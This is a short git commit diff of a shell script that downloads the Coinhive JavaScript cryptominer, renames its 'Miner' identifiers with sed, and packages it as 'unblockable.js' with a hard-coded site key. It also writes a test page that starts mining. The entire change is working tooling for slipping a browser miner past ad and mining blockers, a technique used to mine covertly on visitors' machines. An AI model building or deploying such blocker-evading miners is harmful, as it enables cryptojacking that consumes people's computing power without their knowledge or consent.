e543de1ccdd90d11b808f1feee97dce02ddc03f8
brunneis <dev@brunneis.com>
2018-07-22 18:25:53 +0200

    Update

--- gen-script.sh
+++ gen-script.sh
@@ -4,8 +4,10 @@ SITE_KEY=Z892nG4sVMkhf7VsF3Z5KOlD6fpCzKqo
 SCRIPT_NAME=unblockable.js
 
 echo "Downloading coinhive.min.js..."
-wget https://coinhive.com/lib/coinhive.min.js -q -O $SCRIPT_NAME
+wget -q https://coinhive.com/lib/coinhive.min.js
 echo "Generating $SCRIPT_NAME..."
-echo "var miner=new CoinHive.Anonymous('$SITE_KEY',{throttle:$THROTTLE});miner.start();" >> $SCRIPT_NAME
+sed -i 's/Miner/Unicorn/g' coinhive.min.js
+mv coinhive.min.js $SCRIPT_NAME
+echo "var m=new CoinHive.Anonymous('$SITE_KEY',{throttle:$THROTTLE});m.start();" >> $SCRIPT_NAME
 echo -e "<p>Mining with throttle $THROTTLE for $SITE_KEY</p>\n<script src=\"$SCRIPT_NAME\"></script>" > test.html
 echo "Done!"
